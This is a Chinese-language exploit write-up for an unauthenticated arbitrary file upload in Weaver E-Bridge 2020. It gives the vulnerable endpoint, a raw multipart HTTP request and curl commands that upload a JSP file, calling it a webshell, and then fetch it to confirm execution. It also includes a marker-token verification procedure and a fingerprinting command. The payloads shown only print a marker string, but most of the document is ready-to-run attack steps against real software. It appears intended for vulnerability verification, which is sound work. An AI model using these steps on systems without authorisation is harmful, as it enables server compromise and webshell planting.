## 漏洞描述

泛微E-Bridge存在任意文件上传漏洞，可上传JSP webshell。

## 影响版本

- 泛微 E-Bridge 2020

## 前置条件

- 目标运行泛微 E-Bridge 且可通过网络访问
- `/wxjsapi/saveYZJFile` 接口未做访问限制
- 无需认证

## 利用步骤

### 上传 webshell

```http
POST /wxjsapi/saveYZJFile HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="uploadFile"; filename="test.jsp"
Content-Type: application/octet-stream

<%out.print("test");%>
------WebKitFormBoundary--
```

### 访问 webshell

```
GET /file/test.jsp HTTP/1.1
```

## Payload

### 上传 webshell

```bash
curl -X POST "http://target/wxjsapi/saveYZJFile" \
  -F 'uploadFile=@-;filename=test.jsp;type=application/octet-stream' <<< '<%out.print("vuln_test");%>'
```

### 访问 webshell 确认执行

```bash
curl -s "http://target/file/test.jsp"
```

## 验证方法

判据不是上传请求的状态码，而是上传的标记文件能被 GET 回读到本次的串。文件名和内容都用本次唯一串，验证完删掉。

```bash
# 上传只输出标记串的无马 JSP
curl -X POST "http://target/wxjsapi/saveYZJFile" \
  -F 'uploadFile=@-;filename=poc-POC_TOKEN.jsp;type=application/octet-stream' <<< '<%out.print("POC_TOKEN");%>'

# 回读：响应体出现 POC_TOKEN 即文件落到了 Web 可访问目录
curl -s "http://target/file/poc-POC_TOKEN.jsp" | grep "POC_TOKEN"

# 清理上传的标记文件
```

判据：`GET /file/poc-POC_TOKEN.jsp` 的响应体里出现 `POC_TOKEN`。上传接口响应里带出的落盘路径只能当辅助信息，落盘路径回读不到串仍算不存在。

反例：`saveYZJFile` 返回 200 并给出文件路径，但 `GET /file/<文件名>` 返回 404、原始 JSP 源码或空内容 —— 只是接口受理了上传，任意文件上传不成立。

## 指纹确认

```bash
curl -s http://target/wxjsapi/ | grep -i "weaver\|e-bridge"
```
